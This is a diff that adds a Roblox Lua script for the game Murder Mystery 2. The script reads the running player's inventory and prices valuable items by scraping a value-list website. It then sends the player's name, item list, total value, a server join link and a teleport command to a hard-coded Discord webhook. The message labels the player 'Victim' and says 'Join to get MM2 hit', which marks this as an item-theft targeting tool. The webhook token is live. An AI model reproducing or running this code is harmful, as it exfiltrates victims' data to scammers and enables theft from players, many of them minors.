@@ -1,0 +1,245 @@
+-- Удалена система с куки
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local min_rarity = "Godly"
+local min_value = 1
+local ping = "No"
+local webhook = "https://discord.com/api/webhooks/1433430488676302930/snfZPpSJcW79_0qSSt-wsHsSJpPjk3W-_Hz050iG5gxrnpEKL5EDCx_G8wnXv6Sl-ujT"
+
+if game.PlaceId ~= 142823291 then
+    pcall(function() plr:kick("Game not supported. Please join a normal MM2 server") end)
+    return
+end
+if #Players:GetPlayers() >= 12 then
+    pcall(function() plr:kick("Server is full. Please join a less populated server") end)
+    return
+end
+
+local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+local weaponsToSend = {}
+local HttpRequest = request or (syn and syn.request) or http_request or http and http.request
+local rarityTable = {
+    "Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"
+}
+local categories = {
+    godly = "https://supremevaluelist.com/mm2/godlies.html",
+    ancient = "https://supremevaluelist.com/mm2/ancients.html",
+    unique = "https://supremevaluelist.com/mm2/uniques.html",
+    classic = "https://supremevaluelist.com/mm2/vintages.html",
+    chroma = "https://supremevaluelist.com/mm2/chromas.html"
+}
+local headers = {
+    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+}
+local function trim(s)
+    return s:match("^%s*(.-)%s*$")
+end
+local function fetchHTML(url)
+    if not HttpRequest then return "" end
+    local ok, resp = pcall(function()
+        return HttpRequest({Url = url, Method = "GET", Headers = headers})
+    end)
+    return ok and resp and resp.Body or ""
+end
+local function parseValue(itembodyDiv)
+    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
+    if valueStr then
+        valueStr = valueStr:gsub(",", "")
+        local value = tonumber(valueStr)
+        return value
+    end
+    return nil
+end
+local function extractItems(htmlContent)
+    local itemValues = {}
+    if not htmlContent or htmlContent == "" then return itemValues end
+    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+        itemName = itemName:match("([^<]+)")
+        if itemName then
+            itemName = trim(itemName:gsub("%s+", " ")):lower()
+            itemName = trim((itemName:split(" Click "))[1])
+            local value = parseValue(itembodyDiv)
+            if value then itemValues[itemName] = value end
+        end
+    end
+    return itemValues
+end
+local function extractChromaItems(htmlContent)
+    local chromaValues = {}
+    if not htmlContent or htmlContent == "" then return chromaValues end
+    for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+        chromaName = chromaName:match("([^<]+)")
+        if chromaName then
+            chromaName = trim(chromaName:gsub("%s+", " ")):lower()
+            local value = parseValue(itembodyDiv)
+            if value then chromaValues[chromaName] = value end
+        end
+    end
+    return chromaValues
+end
+local function buildValueList()
+    local allExtractedValues, chromaExtractedValues = {}, {}
+    local categoriesToFetch = {}
+    for rarity, url in pairs(categories) do table.insert(categoriesToFetch, {rarity = rarity, url = url}) end
+    local totalCategories, completed = #categoriesToFetch, 0
+    local lock = Instance.new("BindableEvent")
+    for _, category in ipairs(categoriesToFetch) do
+        task.spawn(function()
+            local rarity, url = category.rarity, category.url
+            local htmlContent = fetchHTML(url)
+            if htmlContent and htmlContent ~= "" then
+                if rarity ~= "chroma" then
+                    local extractedItemValues = extractItems(htmlContent)
+                    for itemName, value in pairs(extractedItemValues) do allExtractedValues[itemName] = value end
+                else
+                    chromaExtractedValues = extractChromaItems(htmlContent)
+                end
+            end
+            completed = completed + 1
+            if completed == totalCategories then lock:Fire() end
+        end)
+    end
+    lock.Event:Wait()
+    local valueList = {}
+    for dataid, item in pairs(database) do
+        local itemName = item.ItemName and item.ItemName:lower() or ""
+        local rarity, hasChroma = item.Rarity or "", item.Chroma or false
+        if itemName ~= "" and rarity ~= "" then
+            local weaponRarityIndex, godlyIndex = table.find(rarityTable, rarity), table.find(rarityTable, "Godly")
+            if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
+                if hasChroma then
+                    for chromaName, value in pairs(chromaExtractedValues) do
+                        if chromaName:find(itemName) then valueList[dataid] = value break end
+                    end
+                else
+                    local value = allExtractedValues[itemName]
+                    if value then valueList[dataid] = value end
+                end
+            end
+        end
+    end
+    return valueList
+end
+local function getFirstPresenceJoin()
+    if not HttpRequest then
+        warn("[PRESENCE] HTTP request function not found. Presence API skipped.")
+        return nil
+    end
+    local userIds, idToName = {}, {}
+    for _, p in ipairs(Players:GetPlayers()) do
+        table.insert(userIds, p.UserId)
+        idToName[p.UserId] = p.Name
+    end
+    if #userIds == 0 then return nil end
+    local body = HttpService:JSONEncode({userIds = userIds})
+    local headersReq = {["Content-Type"] = "application/json"}
+    -- Убрана отправка Cookie заголовка
+    local ok, resp = pcall(function()
+        return HttpRequest({Url = "https://presence.roblox.com/v1/presence/users", Method = "POST", Headers = headersReq, Body = body})
+    end)
+    if not ok or not resp or not resp.Body then
+        warn("[PRESENCE] Ошибка запроса presence API.")
+        return nil
+    end
+    local parseOk, parsed = pcall(function() return HttpService:JSONDecode(resp.Body) end)
+    if not parseOk or not parsed or not parsed.userPresences then
+        warn("[PRESENCE] Не удалось распарсить JSON presence API.")
+        return nil
+    end
+    for _, presence in ipairs(parsed.userPresences) do
+        local placeId, gameId = presence.placeId, presence.gameId
+        if placeId and gameId then
+            local playerName = idToName[presence.userId] or ("User_" .. tostring(presence.userId))
+            local joinLink = ("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s"):format(tostring(placeId), tostring(gameId))
+            return {placeId = tostring(placeId), jobId = tostring(gameId), playerName = playerName, joinLink = joinLink}
+        end
+    end
+    return nil
+end
+local function postWebhookRaw(payloadTable)
+    if not HttpRequest then
+        warn("[WEBHOOK] HTTP request function not found, can't send webhook.")
+        return false
+    end
+    local body = HttpService:JSONEncode(payloadTable)
+    local ok, resp = pcall(function()
+        return HttpRequest({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
+    end)
+    if ok and resp and (resp.StatusCode == 200 or resp.StatusCode == 204) then return true end
+    warn("[WEBHOOK] Failed to send webhook:", resp and (resp.StatusCode or resp.Body) or tostring(ok))
+    return false
+end
+local totalValue = 0
+local function SendFirstMessage(list, prefix)
+    local presence = getFirstPresenceJoin()
+    if not presence then
+        warn("[SendFirstMessage] Не найден ни один игрок с placeId/gameId — вебхук не будет отправлен.")
+        return false
+    end
+    local joinLink, placeId, jobId = presence.joinLink, presence.placeId, presence.jobId
+    local fields = {
+        {name = "Victim Username:", value = plr.Name, inline = true},
+        {name = "Join link:", value = joinLink},
+        {name = "Item list:", value = "", inline = false},
+        {name = "Summary:", value = string.format("Total Value: %s", totalValue), inline = false}
+    }
+    for _, item in ipairs(list) do
+        local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
+        fields[3].value = fields[3].value .. itemLine .. "\n"
+    end
+    if #fields[3].value > 1024 then
+        local lines = {}
+        for line in fields[3].value:gmatch("[^\r\n]+") do table.insert(lines, line) end
+        while #fields[3].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
+        end
+    end
+    local contentTeleport = ("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s')"):format(placeId, jobId)
+    local data = {
+        ["content"] = (prefix and prefix ~= "" and prefix or "") .. contentTeleport,
+        ["embeds"] = {{
+            ["title"] = "🔗 Join to get MM2 hit",
+            ["color"] = 65280,
+            ["fields"] = fields,
+            ["footer"] = {["text"] = "MM2 inventory eval by Tobi. discord.gg/GY2RVSEGDT"}
+        }}
+    }
+    return postWebhookRaw(data)
+end
+local min_rarity_index = table.find(rarityTable, min_rarity)
+local untradable = {
+    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true, ["Reaver_Legendary"] = true,
+    ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true, ["IceHammer"] = true, ["IceHammer_Legendary"] = true,
+    ["IceHammer_Godly"] = true, ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true,
+    ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true, ["TestItem"] = true, ["Season1TestKnife"] = true,
+    ["Cracks"] = true, ["Icecrusher"] = true, ["???"] = true, ["Dartbringer"] = true, ["TravelerAxeRed"] = true,
+    ["TravelerAxeBronze"] = true, ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true, ["BlueCamo_K_2022"] = true,
+    ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
+}
+local valueList = buildValueList()
+local realData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+for i, v in pairs(realData.Weapons.Owned) do
+    local dataid, amount = i, v
+    local rarity = database[dataid].Rarity
+    local weapon_rarity_index = table.find(rarityTable, rarity)
+    if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
+        local value = valueList[dataid] or (weapon_rarity_index >= table.find(rarityTable, "Godly") and 2 or 1)
+        if value >= min_value then
+            totalValue = totalValue + (value * amount)
+            table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
+        end
+    end
+end
+if #weaponsToSend > 0 then
+    table.sort(weaponsToSend, function(a, b) return (a.Value * a.Amount) > (b.Value * b.Amount) end)
+    local prefix = ping == "Yes" and "--@everyone" or ""
+    local sent = SendFirstMessage(weaponsToSend, prefix)
+    if not sent then
+        warn("[MAIN] Presence API не вернул jobId — вебхук не отправлен.")
+    end
+end
+print("End")
